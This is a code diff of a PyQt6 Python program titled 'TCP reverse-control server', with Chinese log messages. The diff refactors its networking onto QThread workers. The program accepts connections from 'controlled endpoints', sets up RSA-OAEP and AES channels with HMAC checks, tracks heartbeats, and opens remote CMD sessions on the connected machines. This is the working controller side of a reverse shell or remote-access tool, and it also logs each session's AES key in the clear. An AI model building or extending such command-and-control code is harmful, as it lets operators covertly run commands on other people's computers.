@@ -1,18 +1,16 @@
 import sys
 import os
 import socket
-import threading
+import struct
 from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
 QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
 QMenu, QAbstractItemView)
-from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot
-import struct
+from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QThread
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import hmac
 from cryptography.hazmat.primitives import padding
 import os as os_rand
 
@@ -20,6 +18,129 @@ import os as os_rand
 class ClientSignals(QObject):
     on_outp = pyqtSignal(object, str)
     on_disconnect = pyqtSignal(object)
+    on_new_client = pyqtSignal(object)
+    on_model_refresh = pyqtSignal(object)
+
+
+class AcceptWorker(QObject):
+    sig_new_client = pyqtSignal(object)
+    sig_log = pyqtSignal(str)
+    def __init__(self, port, rsa_priv):
+        super().__init__()
+        self.port = port
+        self.rsa_priv = rsa_priv
+        self.server_sock = None
+        self.running = False
+
+    @pyqtSlot()
+    def run(self):
+        try:
+            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.server_sock.bind(("0.0.0.0", self.port))
+            self.server_sock.listen(8)
+            self.running = True
+            self.sig_log.emit(f"开始监听端口 {self.port}")
+            while self.running:
+                try:
+                    conn, addr = self.server_sock.accept()
+                    sess = ClientSession(conn, addr, self.rsa_priv)
+                    self.sig_new_client.emit(sess)
+                except OSError:
+                    break
+        except Exception as e:
+            self.sig_log.emit(f"监听异常:{repr(e)}")
+
+    @pyqtSlot()
+    def stop(self):
+        self.running = False
+        if self.server_sock:
+            try:
+                self.server_sock.close()
+            except Exception:
+                pass
+
+
+class ClientRecvWorker(QObject):
+    sig_outp = pyqtSignal(object, str)
+    sig_disconnect = pyqtSignal(object)
+    sig_refresh_model = pyqtSignal(object)
+    sig_log = pyqtSignal(str)
+    def __init__(self, sess):
+        super().__init__()
+        self.sess = sess
+
+    @pyqtSlot()
+    def run(self):
+        buf = self.sess._recv_buf
+        sess = self.sess
+        while sess.connected:
+            try:
+                chunk = sess.conn.recv(4096)
+                if not chunk:
+                    break
+                buf.extend(chunk)
+                while len(buf) >= 4:
+                    body_len = struct.unpack(">I", buf[0:4])[0]
+                    total_packet_len = 4 + body_len
+                    if len(buf) < total_packet_len:
+                        break
+                    body = bytes(buf[4:total_packet_len])
+                    del buf[:total_packet_len]
+
+                    if not sess.handshake_done:
+                        if body_len == 256:
+                            try:
+                                aes16 = sess.rsa_private.decrypt(
+                                    body,
+                                    padding.OAEP(
+                                        mgf=padding.MGF1(algorithm=hashes.SHA1()),
+                                        algorithm=hashes.SHA1(),
+                                        label=None
+                                    )
+                                )
+                                sess.aes_key = aes16
+                                sess.handshake_done = True
+                                self.sig_log.emit(f"[{sess.ip_str}] ✅握手完成 aes={aes16.hex()}")
+                                self.sig_refresh_model.emit(sess)
+                            except Exception as e:
+                                self.sig_log.emit(f"[{sess.ip_str}] ❌RSA解密失败:{repr(e)}")
+                                sess.close()
+                        else:
+                            self.sig_log.emit(f"[{sess.ip_str}] 握手收到异常包 len={body_len}")
+                            sess.close()
+                        continue
+
+                    if body_len < (16 + 32):
+                        self.sig_log.emit(f"[{sess.ip_str}] 加密包长度过短 {body_len}")
+                        sess.close()
+                        continue
+                    iv_cipher_part = body[:-32]
+                    recv_hmac = body[-32:]
+                    calc_h = sess._calc_hmac(iv_cipher_part)
+                    if calc_h != recv_hmac:
+                        self.sig_log.emit(f"[{sess.ip_str}] ❌HMAC校验失败，数据包被篡改")
+                        sess.close()
+                        continue
+                    try:
+                        plain_body = sess._decrypt_packet(iv_cipher_part)
+                    except Exception as e:
+                        self.sig_log.emit(f"[{sess.ip_str}] AES解密异常 {repr(e)}")
+                        sess.close()
+                        continue
+                    if len(plain_body)>=4:
+                        cmd_code = plain_body[0:4]
+                        if cmd_code == b"PONG":
+                            sess.last_pong = datetime.now()
+                            self.sig_refresh_model.emit(sess)
+                        elif cmd_code == b"OUTP":
+                            output_bytes = plain_body[4:]
+                            out_text = output_bytes.decode("gbk", errors="replace")
+                            self.sig_outp.emit(sess, out_text)
+            except OSError:
+                break
+        sess.close()
+        self.sig_disconnect.emit(sess)
 
 
 class ClientSession:
@@ -30,10 +151,11 @@ class ClientSession:
         self.last_pong = datetime.now()
         self.connected = True
         self._recv_buf = bytearray()
-        self.signals = ClientSignals()
         self.handshake_done = False
         self.aes_key: bytes | None = None
         self.rsa_private = rsa_priv
+        self.worker_thread = None
+        self.worker = None
 
     def _encrypt_packet(self, plain_data: bytes) -> bytes:
         iv = os_rand.urandom(16)
@@ -168,8 +290,9 @@ class MainWindow(QMainWindow):
         self.rsa_private_key = rsa_key
         self.setWindowTitle("TCP 反向控制端")
         self.resize(700, 500)
-        self.server_sock: socket.socket | None = None
-        self.server_running = False
+        self.accept_thread = None
+        self.accept_worker = None
+        self.client_workers = []
         self.client_model = ClientListModel()
         self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
         w = QWidget()
@@ -200,19 +323,27 @@ class MainWindow(QMainWindow):
     def log(self, msg):
         self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
 
-    def accept_loop(self):
-        while self.server_running:
-            try:
-                conn, addr = self.server_sock.accept()
-                sess = ClientSession(conn, addr, self.rsa_private_key)
-                sess.signals.on_outp.connect(self.handle_session_outp)
-                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
-                self.client_model.add(sess)
-                self.log(f"新被控端接入 {sess.ip_str}")
-                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
-                t.start()
-            except OSError:
-                break
+    @pyqtSlot(object)
+    def on_new_client(self, sess:ClientSession):
+        self.log(f"新被控端接入 {sess.ip_str}")
+        # 每个客户端单独QThread
+        worker = ClientRecvWorker(sess)
+        th = QThread()
+        worker.moveToThread(th)
+        th.started.connect(worker.run)
+        worker.sig_outp.connect(self.handle_session_outp)
+        worker.sig_disconnect.connect(self.handle_session_disconnect)
+        worker.sig_refresh_model.connect(self.on_client_refresh)
+        worker.sig_log.connect(self.log)
+        worker.sig_disconnect.connect(lambda x: self.cleanup_worker(worker, th))
+        self.client_workers.append((worker, th))
+        self.client_model.add(sess)
+        th.start()
+
+    @pyqtSlot(object)
+    def on_client_refresh(self, sess):
+        idx = self.client_model.items.index(sess)
+        self.client_model.dataChanged.emit(self.client_model.index(idx), self.client_model.index(idx))
 
     @pyqtSlot(object, str)
     def handle_session_outp(self, sess: ClientSession, text: str):
@@ -228,102 +359,57 @@ class MainWindow(QMainWindow):
         self.client_model.remove_by_obj(sess)
         self.log(f"被控端断开 {sess.ip_str}")
 
-    def client_recv_loop(self, sess: ClientSession):
-        buf = sess._recv_buf
-        while sess.connected:
-            try:
-                chunk = sess.conn.recv(4096)
-                if not chunk:
-                    break
-                buf.extend(chunk)
-                while len(buf) >= 4:
-                    body_len = struct.unpack(">I", buf[0:4])[0]
-                    total_packet_len = 4 + body_len
-                    if len(buf) < total_packet_len:
-                        break
-                    body = bytes(buf[4:total_packet_len])
-                    del buf[:total_packet_len]
-
-                    if not sess.handshake_done:
-                        if body_len == 256:
-                            self.log(f"[{sess.ip_str}] DEBUG: body_len={body_len}")
-                            try:
-                                aes16 = sess.rsa_private.decrypt(
-                                    body,
-                                    padding.OAEP(
-                                        mgf=padding.MGF1(algorithm=hashes.SHA1()),
-                                        algorithm=hashes.SHA1(),
-                                        label=None
-                                    )
-                                )
-                                sess.aes_key = aes16
-                                sess.handshake_done = True
-                                self.log(f"[{sess.ip_str}] ✅握手完成，获得AES密钥 aes={aes16.hex()}")
-                                self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
-                            except Exception as e:
-                                self.log(f"[{sess.ip_str}] ❌RSA解密失败:{repr(e)}")
-                                sess.close()
-                        else:
-                            self.log(f"[{sess.ip_str}] 握手收到异常包 len={body_len}")
-                            sess.close()
-                        continue
-
-                    if body_len < (16 + 32):
-                        self.log(f"[{sess.ip_str}] 加密包长度过短 {body_len}")
-                        sess.close()
-                        continue
-                    iv_cipher_part = body[:-32]
-                    recv_hmac = body[-32:]
-                    calc_h = sess._calc_hmac(iv_cipher_part)
-                    if calc_h != recv_hmac:
-                        self.log(f"[{sess.ip_str}] ❌HMAC校验失败，数据包被篡改")
-                        sess.close()
-                        continue
-                    try:
-                        plain_body = sess._decrypt_packet(iv_cipher_part)
-                    except Exception as e:
-                        self.log(f"[{sess.ip_str}] AES解密异常 {repr(e)}")
-                        sess.close()
-                        continue
-                    if len(plain_body)>=4:
-                        cmd_code = plain_body[0:4]
-                        if cmd_code == b"PONG":
-                            sess.last_pong = datetime.now()
-                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
-                        elif cmd_code == b"OUTP":
-                            output_bytes = plain_body[4:]
-                            out_text = output_bytes.decode("gbk", errors="replace")
-                            sess.signals.on_outp.emit(sess, out_text)
-            except OSError:
-                break
-        sess.close()
-        sess.signals.on_disconnect.emit(sess)
+    def cleanup_worker(self, worker, th):
+        try:
+            th.quit()
+            th.wait(1000)
+        except Exception:
+            pass
+        if (worker, th) in self.client_workers:
+            self.client_workers.remove((worker, th))
 
     def start_server(self):
         port = int(self.port_edit.text())
-        self.server_sock = socket.socket(socket.AF_INET, SOCK_STREAM)
-        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_sock.bind(("0.0.0.0", port))
-        self.server_sock.listen(8)
-        self.server_running = True
-        threading.Thread(target=self.accept_loop, daemon=True).start()
+        self.accept_worker = AcceptWorker(port, self.rsa_private_key)
+        self.accept_thread = QThread()
+        self.accept_worker.moveToThread(self.accept_thread)
+        self.accept_thread.started.connect(self.accept_worker.run)
+        self.accept_worker.sig_new_client.connect(self.on_new_client)
+        self.accept_worker.sig_log.connect(self.log)
+        self.accept_thread.start()
         self.btn_start.setEnabled(False)
         self.btn_stop.setEnabled(True)
-        self.log(f"开始监听端口 {port}")
 
     def stop_server(self):
-        self.server_running = False
-        if self.server_sock:
-            try:
-                self.server_sock.close()
-            except Exception:
-                pass
+        if self.accept_worker:
+            self.accept_worker.stop()
+        if self.accept_thread:
+            self.accept_thread.quit()
+            self.accept_thread.wait(1500)
+        for worker, th in list(self.client_workers):
+            worker.sess.close()
+            th.quit()
+            th.wait(500)
+        self.client_workers.clear()
         for s in self.client_model.items:
             s.close()
         self.open_cmd_dialogs.clear()
         self.btn_start.setEnabled(True)
         self.btn_stop.setEnabled(False)
         self.log("停止监听")
+
+    def open_cmd_session(self, sess):
+        if sess in self.open_cmd_dialogs:
+            dlg = self.open_cmd_dialogs[sess]
+            if dlg.isVisible():
+                dlg.raise_()
+                dlg.activateWindow()
+                return
+            else:
+                del self.open_cmd_dialogs[sess]
+        dlg = RemoteCmdDialog(sess, parent=self)
+        self.open_cmd_dialogs[sess] = dlg
+        dlg.show()
 
     def on_context_menu(self, pos):
         idx = self.view.indexAt(pos)
@@ -332,22 +418,7 @@ class MainWindow(QMainWindow):
         sess: ClientSession = self.client_model.items[idx.row()]
         menu = QMenu()
         act_open_cmd = menu.addAction("打开远程 CMD 会话")
-
-        @pyqtSlot()
-        def on_menu_click():
-            if sess in self.open_cmd_dialogs:
-                dlg = self.open_cmd_dialogs[sess]
-                if dlg.isVisible():
-                    dlg.raise_()
-                    dlg.activateWindow()
-                    return
-                else:
-                    del self.open_cmd_dialogs[sess]
-            dlg = RemoteCmdDialog(sess, parent=self)
-            self.open_cmd_dialogs[sess] = dlg
-            dlg.show()
-
-        act_open_cmd.triggered.connect(on_menu_click)
+        act_open_cmd.triggered.connect(lambda: self.open_cmd_session(sess))
         menu.exec(self.view.viewport().mapToGlobal(pos))
 
     def closeEvent(self, event):
